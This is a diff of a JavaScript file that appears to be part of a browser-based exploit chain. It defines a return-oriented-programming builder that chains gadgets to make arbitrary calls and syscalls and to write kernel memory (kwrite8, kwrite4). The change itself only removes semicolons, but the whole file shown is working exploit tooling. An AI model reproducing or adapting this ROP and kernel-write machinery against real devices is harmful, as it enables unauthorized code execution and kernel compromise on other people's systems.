@@ -25,7 +25,7 @@ window.rop = function () {
     this.pushSymbolic = function () {
         this.count++;
         return this.count - 1;
-    };
+    }
 
     this.finalizeSymbolic = function (idx, val) {
         if (val instanceof int64) {
@@ -35,11 +35,11 @@ window.rop = function () {
             this.stack_array[stack_reserved_idx + idx * 2] = val;
             this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
         }
-    };
+    }
 
     this.push = function (val) {
         this.finalizeSymbolic(this.pushSymbolic(), val);
-    };
+    }
 
     this.push_write8 = function (where, what) {
         this.push(gadgets["pop rdi"]);
@@ -47,7 +47,7 @@ window.rop = function () {
         this.push(gadgets["pop rsi"]);
         this.push(what);
         this.push(gadgets["mov [rdi], rsi"]);
-    };
+    }
 
     this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
         if (rdi != undefined) {
@@ -82,57 +82,57 @@ window.rop = function () {
 
         this.push(rip);
         return this;
-    };
+    }
 
     this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
         this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
         this.write_result(this.retval);
         this.run();
         return p.read8(this.retval);
-    };
+    }
 
     this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
         return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
-    };
+    }
 
     //get rsp of the next push
     this.get_rsp = function () {
         return this.stack.add32(this.count * 8);
-    };
+    }
     this.write_result = function (where) {
         this.push(gadgets["pop rdi"]);
         this.push(where);
         this.push(gadgets["mov [rdi], rax"]);
-    };
+    }
     this.write_result4 = function (where) {
         this.push(gadgets["pop rdi"]);
         this.push(where);
         this.push(gadgets["mov [rdi], eax"]);
-    };
+    }
 
     this.jmp_rsp = function (rsp) {
         this.push(window.gadgets["pop rsp"]);
         this.push(rsp);
-    };
+    }
 
     this.run = function () {
         p.launch_chain(this);
         this.clear();
-    };
+    }
 
     this.KERNEL_BASE_PTR_VAR;
     this.set_kernel_var = function (arg) {
         this.KERNEL_BASE_PTR_VAR = arg;
-    };
+    }
 
     this.rax_kernel = function (offset) {
         this.push(gadgets["pop rax"]);
-        this.push(this.KERNEL_BASE_PTR_VAR);
+        this.push(this.KERNEL_BASE_PTR_VAR)
         this.push(gadgets["mov rax, [rax]"]);
         this.push(gadgets["pop rsi"]);
-        this.push(offset);
+        this.push(offset)
         this.push(gadgets["add rax, rsi"]);
-    };
+    }
 
     this.write_kernel_addr_to_chain_later = function (offset) {
         this.push(gadgets["pop rdi"]);
@@ -140,26 +140,26 @@ window.rop = function () {
         this.rax_kernel(offset);
         this.push(gadgets["mov [rdi], rax"]);
         return idx;
-    };
+    }
 
     this.kwrite8 = function (offset, qword) {
         this.rax_kernel(offset);
         this.push(gadgets["pop rsi"]);
         this.push(qword);
         this.push(gadgets["mov [rax], rsi"]);
-    };
+    }
     this.kwrite4 = function (offset, dword) {
         this.rax_kernel(offset);
         this.push(gadgets["pop rdx"]);
         this.push(dword);
         this.push(gadgets["mov [rax], edx"]);
-    };
+    }
 
     this.kwrite8_kaddr = function (offset1, offset2) {
         this.rax_kernel(offset2);
         this.push(gadgets["mov rdx, rax"]);
         this.rax_kernel(offset1);
         this.push(gadgets["mov [rax], rdx"]);
-    };
+    }
     return this;
 };
